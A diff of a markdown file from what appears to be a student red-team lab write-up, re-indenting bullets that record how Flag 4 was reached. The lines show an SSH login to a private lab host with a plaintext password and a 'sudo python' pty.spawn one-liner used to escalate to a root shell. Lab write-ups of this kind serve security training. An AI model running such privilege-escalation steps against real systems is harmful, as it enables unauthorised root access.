@@ -133,11 +133,11 @@ The following vulnerabilities were identified on each target:
 
 ![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image6.png)
   
-* SSH using Steven’s credentials, Flag 4 was found.
-* ssh steven@192.168.1.110 
-* pw:pink84
-* sudo -l
-* sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
+   * SSH using Steven’s credentials, Flag 4 was found.
+   * ssh steven@192.168.1.110 
+   * pw:pink84
+   * sudo -l
+   * sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
 
 ![](https://github.com/y2keno/final_project/blob/652b01b2217eb4d50b611e7bdaafb4eb5b2ed6fb/Final_Red_Team/images/image9.png)
   
